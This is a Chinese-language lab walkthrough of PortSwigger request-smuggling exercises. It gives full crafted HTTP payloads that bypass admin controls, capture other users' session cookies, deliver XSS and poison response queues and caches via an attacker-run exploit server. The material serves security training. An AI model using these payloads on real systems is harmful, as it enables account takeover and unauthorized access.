+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a3600c8047fa378c16b217e00fb0025.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">60</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意这这个60代表当前分区的字符数目</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208202101519.png" alt="image-20221208202101519"></p>
+<p>同样的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a3600c8047fa378c16b217e00fb0025.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208202917733.png" alt="image-20221208202917733"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a3600c8047fa378c16b217e00fb0025.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">88</span><br><span class="line">POST /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208203025328.png" alt="image-20221208203025328"></p>
+<h1 id="利用-HTTP-请求走私来揭示前端请求重写"><a href="#利用-HTTP-请求走私来揭示前端请求重写" class="headerlink" title="利用 HTTP 请求走私来揭示前端请求重写"></a>利用 HTTP 请求走私来揭示前端请求重写</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208203414095.png" alt="image-20221208203414095"></p>
+<p>当访问 admin页面的时候发现需要 requested from 127.0.0.1 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208204754373.png" alt="image-20221208204754373"></p>
+<p>而在题目中 说有一个类似于X-Forwarded-For 标头的标记 因此我们首先需要得到这个值</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208204939362.png" alt="image-20221208204939362"></p>
+<p>观察到在search 页面存在 搜索结果的回显 简单举个例子来看看 就可轻松理解</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208205033610.png" alt="image-20221208205033610"></p>
+<p>也就是说我们需要构造一个请求把上一个请求得到的XFF头添加到 search页面中回显出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a8a0046033e8236c0cf1dc300660044.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 124</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=</span><br></pre></td></tr></table></figure>
+
+<p>这样search&#x3D;后面就会拼接 上一个的http请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a8a0046033e8236c0cf1dc300660044.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 124</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=POST / HTTP/1.1</span><br><span class="line">Host: 0a8a0046033e8236c0cf1dc300660044.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 124</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208205156267.png" alt="image-20221208205156267"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a8a0046033e8236c0cf1dc300660044.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 122</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-ohwkwW-Ip: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208205614738.png" alt="image-20221208205614738"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208205652045.png" alt="image-20221208205652045"></p>
+<h1 id="利用-HTTP-请求走私来捕获其他用户的请求"><a href="#利用-HTTP-请求走私来捕获其他用户的请求" class="headerlink" title="利用 HTTP 请求走私来捕获其他用户的请求"></a>利用 HTTP 请求走私来捕获其他用户的请求</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208210444220.png" alt="image-20221208210444220"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ace008d03451d0dc4eef55000b500b4.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 280</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Cookie: session=5WLxv4DxexBZQwdCmKkfe6yKhGNCYJfH</span><br><span class="line">Content-Length: 425</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">csrf=K9lQhXSZ9UYM12Ec8lWX2bqNnB3Z1rIC&amp;postId=7&amp;name=123&amp;email=123456%40test.com&amp;website=https%3A%2F%2F1.com%23111&amp;comment=12</span><br></pre></td></tr></table></figure>
+
+<p>大概的 攻击思路就是通过 comment 页面将受害者 用户的 http请求存放到comment中去 其中需要注意第二个请求的Content-Length: 425 需要稍微大一点 否则无法包含受害者的请求头</p>
+<p>访问一次即可 接着去刷新评论页面等等 comment提交即可</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208211341553.png" alt="image-20221208211341553"></p>
+<p>尝试了好多次才成功</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208220435642.png" alt="image-20221208220435642"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208220535994.png" alt="image-20221208220535994"></p>
+<h1 id="利用-HTTP-请求走私来传递反射-XSS"><a href="#利用-HTTP-请求走私来传递反射-XSS" class="headerlink" title="利用 HTTP 请求走私来传递反射 XSS"></a>利用 HTTP 请求走私来传递反射 XSS</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208220814905.png" alt="image-20221208220814905"></p>
+<p>可以看到userAgent 在页面存在回显</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208220808683.png" alt="image-20221208220808683"></p>
+<p>尝试执行xss</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /post?postId=7 HTTP/1.1</span><br><span class="line">Host: 0a6d006503a2cacac056392e000c0057.web-security-academy.net</span><br><span class="line">Cookie: session=M0jBc0qN762wBZsesPePlcGbAAhn5PXu</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;99&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://0a6d006503a2cacac056392e000c0057.web-security-academy.net/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208220956252.png" alt="image-20221208220956252"></p>
+<p>因此我们需要走私此请求到后端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a6d006503a2cacac056392e000c0057.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 150</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line">User-Agent: a&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p>等待受害者执行即可</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208221339210.png" alt="image-20221208221339210"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221208221542787.png" alt="image-20221208221542787"></p>
+<h1 id="通过-H2-TE-请求走私的响应队列中毒"><a href="#通过-H2-TE-请求走私的响应队列中毒" class="headerlink" title="通过 H2.TE 请求走私的响应队列中毒"></a>通过 H2.TE 请求走私的响应队列中毒</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210172043653.png" alt="image-20221210172043653"></p>
+<p>这里首先需要去阅读以下HTTP&#x2F;2 协议的格式 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling</span><br></pre></td></tr></table></figure>
+
+<p>大致的请求头是一致的</p>
+<p>接着需要了解一下 走私响应队列中毒</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning</span><br></pre></td></tr></table></figure>
+
+<p>题目中说明了两点 管理员每隔十五秒就会登录一次  当你出现异常的请求时,需要连续发送十个正常的请求即可消除异常状态 也就是消除中毒状态</p>
+<p>根据题目的描述 需要开启 Allow HTTP&#x2F;2 ALPN override选项</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210173352826.png" alt="image-20221210173352826"></p>
+<p>需要选中 HTTP&#x2F;2 协议</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210172949993.png" alt="image-20221210172949993"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a6f00dc04efb5cbc285929e008b0093.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /wanan HTTP/1.1</span><br><span class="line">Host: 0a6f00dc04efb5cbc285929e008b0093.web-security-academy.net</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里我们发送第一个请求 其中前端服务器将HTTP&#x2F;2 重写为HTTP&#x2F;1.1 并把这个请求转发到 后端服务器 但是后端服务器并不认为这是一个请求 原因是存在 Transfer-Encoding: chunked 所以后端服务器将这个请求分成两个不同的请求 分别响应并重写为HTTP&#x2F;2 并发送给前端服务器 但是由于前端服务器刚开始仅收到了一个 请求 因此也只返回一个响应. 当前端服务器再次收到请求时会 直接发送剩余的响应.</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210182249779.png" alt="image-20221210182249779"></p>
+<p>因此如果我们发送上述请求会正常响应 , 但是当我们发送一个完全正常的数据包时则会报404的错误</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210183618984.png" alt="image-20221210183618984"></p>
+<p>第二次我们发送一个正常的请求  这里响应的404 那么这里的响应很明显就是我们我们的 第二个请求 才会响应404   如果这里没有成功的话建议 连续发送十次正确的请求包 重置下服务器</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210183624407.png" alt="image-20221210183624407"></p>
+<p>那么现在我们需要毒化队列并 在 admin登录之后 我们紧接着访问以获取到 admin的登录页面</p>
+<p>发送一次请求 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210185023124.png" alt="image-20221210185023124"></p>
+<p>稍等五秒钟 发送正常请求 如果没有成功就发送十次正常请求重置服务器 并进行循环</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210185118685.png" alt="image-20221210185118685"></p>
+<p>当访问得到302之后 我们就可以拿到admin的cookie</p>
+<p>由于我们已经污染队列 我们需要多次尝试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210185436265.png" alt="image-20221210185436265"></p>
+<p>接着删除用户即可</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210185537339.png" alt="image-20221210185537339"></p>
+<h1 id="H2-CL-请求走私"><a href="#H2-CL-请求走私" class="headerlink" title="H2.CL 请求走私"></a>H2.CL 请求走私</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210190603786.png" alt="image-20221210190603786"></p>
+<p>大致思路类似  第一次请求 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a6800330349a988c00a417000ca009a.web-security-academy.net</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /wanan HTTP/1.1</span><br><span class="line">Host: 123</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">123=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210195246641.png" alt="image-20221210195246641"></p>
+<p>这里需要注意的是这里第二个请求的Content-Length 需要稍微大一点 目的是包含第二个请求使之失效 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a6800330349a988c00a417000ca009a.web-security-academy.net</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /wanan HTTP/1.1</span><br><span class="line">Host: 123</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">123=GET / HTTP/1.1</span><br><span class="line">Host: 0a6800330349a988c00a417000ca009a.web-security-academy.net</span><br><span class="line">Cookie: session=9nk6AdX8fb9XaLU4WmuGrFppEhJfZIgM</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;99&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://portswigger.net/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210195231198.png" alt="image-20221210195231198"></p>
+<p>题目让我们走私请求 并且重定向到我们的服务器上去 那么我们首先就需要寻找到一个 可以重定向js的地方</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210195604029.png" alt="image-20221210195604029"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210195609419.png" alt="image-20221210195609419"></p>
+<p>可以看到进行的js的重定向</p>
+<p>我们需要走私此请求到我们自己的host中去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a6800330349a988c00a417000ca009a.web-security-academy.net</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /resources/js HTTP/1.1</span><br><span class="line">Host: exploit-0a4800bf03d6a9bac0b0439401ad0094.exploit-server.net</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210200608130.png" alt="image-20221210200608130"></p>
+<p>可以看到重定向到我们的服务器去了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210200613136.png" alt="image-20221210200613136"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210200721994.png" alt="image-20221210200721994"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210200745883.png" alt="image-20221210200745883"></p>
+<p>多次尝试直到成功即可</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210201159786.png" alt="image-20221210201159786"></p>
+<h1 id="通过-CRLF-注入的-HTTP-x2F-2-请求走私"><a href="#通过-CRLF-注入的-HTTP-x2F-2-请求走私" class="headerlink" title="通过 CRLF 注入的 HTTP&#x2F;2 请求走私"></a>通过 CRLF 注入的 HTTP&#x2F;2 请求走私</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210204008740.png" alt="image-20221210204008740"></p>
+<p>构造一下CRLF</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a100058038d6d6dc28b2fec009d00e3.web-security-academy.net</span><br><span class="line"></span><br><span class="line">GET /wanan HTTP/1.1</span><br><span class="line">Host: 0a100058038d6d6dc28b2fec009d00e3.web-security-academy.net</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210210538298.png" alt="image-20221210210538298"></p>
+<p>注意这里的 \r\n并不是手打上去的 而是使用shift + 回车 生成的</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210210620118.png" alt="image-20221210210620118"></p>
+<p>接着我们尝试Transfer-Encoding: chunked</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a100058038d6d6dc28b2fec009d00e3.web-security-academy.net</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /wanan HTTP/1.1</span><br><span class="line">Host: 0a100058038d6d6dc28b2fec009d00e3.web-security-academy.net</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210210431577.png" alt="image-20221210210431577"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210210313297.png" alt="image-20221210210313297"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210210354375.png" alt="image-20221210210354375"></p>
+<p>那么现在我们需要通过 search 带出数据</p>
+<p>可以看到这里的search会返回上一次search的内容</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210210858585.png" alt="image-20221210210858585"></p>
+<p>这里修改请求正文</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Cookie: session=7BZR5If5xP3h6B9qSldgWfHHBzWNbAdV</span><br><span class="line">Host: 0a100058038d6d6dc28b2fec009d00e3.web-security-academy.net</span><br><span class="line">Content-Length: 800</span><br><span class="line"></span><br><span class="line">search=</span><br></pre></td></tr></table></figure>
+
+<p>发出请求等待15秒 刷新浏览器</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210212150096.png" alt="image-20221210212150096"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210212211363.png" alt="image-20221210212211363"></p>
+<p>替换cookie发出即可</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210212253751.png" alt="image-20221210212253751"></p>
+<h1 id="通过-CRLF-注入拆分-HTTP-x2F-2-请求"><a href="#通过-CRLF-注入拆分-HTTP-x2F-2-请求" class="headerlink" title="通过 CRLF 注入拆分 HTTP&#x2F;2 请求"></a>通过 CRLF 注入拆分 HTTP&#x2F;2 请求</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210221503230.png" alt="image-20221210221503230"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X</span><br><span class="line"></span><br><span class="line">GET /wanan HTTP/1.1</span><br><span class="line">Host: 0ad900b3032499c3c2d6b52a002c0081.web-security-academy.net</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210221751459.png" alt="image-20221210221751459"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210221813712.png" alt="image-20221210221813712"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210221920941.png" alt="image-20221210221920941"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221210221937988.png" alt="image-20221210221937988"></p>
+<h1 id="CL-0-请求走私"><a href="#CL-0-请求走私" class="headerlink" title="CL.0 请求走私"></a>CL.0 请求走私</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218171316585.png" alt="image-20221218171316585"></p>
+<p>这里可能需要高版本的 burp</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218183747983.png" alt="image-20221218183747983"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218183758452.png" alt="image-20221218183758452"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ae1001e03c84c02c037bd3b001600a2.web-security-academy.net</span><br><span class="line">Cookie: session=O8G8jGBliIRHWoF8pptBWRSK9JsEbnaN</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: keep-live</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">GET /404page HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218185539906.png" alt="image-20221218185539906"></p>
+<p>这里简单解释一下  这里漏洞产生的原因主要是由于前端服务器正常接收 CL请求头 而后端直接忽视 不接受请求体也就是说 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218191051104.png" alt="image-20221218191051104"></p>
+<p>后端以中间的空行来进行隔断请求 因此在这种情况下这个请求就被划分为了两个请求 </p>
+<p>Connection: keep-live 是为了使连接保持下去 目的是为了发送第二个请求的时候使用相同的tcp连接 </p>
+<p>那么为什么要发送两个http请求呢  那么我们假设只发送上述请求,前端服务器总共接受到了一个请求,而后端服务器将一个请求分成了两个响应,返回给了前端服务器,前端服务器只有一个请求,因此也就只产生一个响应.所以如果需要得到第二个响应就需要在给前端服务器发送一个请求</p>
+<p>完成后直接发送请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218185645519.png" alt="image-20221218185645519"></p>
+<p>这里发现两个都是200 并没有出现 404, 这里的主要原因是这里的 url 并不存在CL.0走私,因此我们需要去寻找存在漏洞的 url </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218185659749.png" alt="image-20221218185659749"></p>
+<p>这里开始尝试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218191645303.png" alt="image-20221218191645303"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218191653926.png" alt="image-20221218191653926"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218191700586.png" alt="image-20221218191700586"></p>
+<p>这里的  &#x2F;resources&#x2F;labheader&#x2F;js&#x2F;labHeader.js 可以发现是与我们分析的一样的 说明这里存在http请求走私</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /resources/labheader/js/labHeader.js HTTP/1.1</span><br><span class="line">Host: 0ae1001e03c84c02c037bd3b001600a2.web-security-academy.net</span><br><span class="line">Cookie: session=O8G8jGBliIRHWoF8pptBWRSK9JsEbnaN</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: keep-live</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p>尝试走私 admin页面</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218191811420.png" alt="image-20221218191811420"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218191835603.png" alt="image-20221218191835603"></p>
+<h1 id="利用-HTTP-请求走私来执行-Web-缓存中毒"><a href="#利用-HTTP-请求走私来执行-Web-缓存中毒" class="headerlink" title="利用 HTTP 请求走私来执行 Web 缓存中毒"></a>利用 HTTP 请求走私来执行 Web 缓存中毒</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218194511159.png" alt="image-20221218194511159"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218201511878.png" alt="image-20221218201511878"></p>
+<p>这里可以看到存在302 跳转,并且可以看到这里的跳转host可能被我们控制 因此我们需要走私的就是这个页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a06007204141107c05b2279009500ef.web-security-academy.net</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=6 HTTP/1.1</span><br><span class="line">Host: exploit-0a6200b30452115cc01b218101570042.exploit-server.net</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>第一次发送</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218203039260.png" alt="image-20221218203039260"></p>
+<p>第二次发送 可以看到请求跳转到我们的host上去了 注意这里跳转的路径信息是post</p>
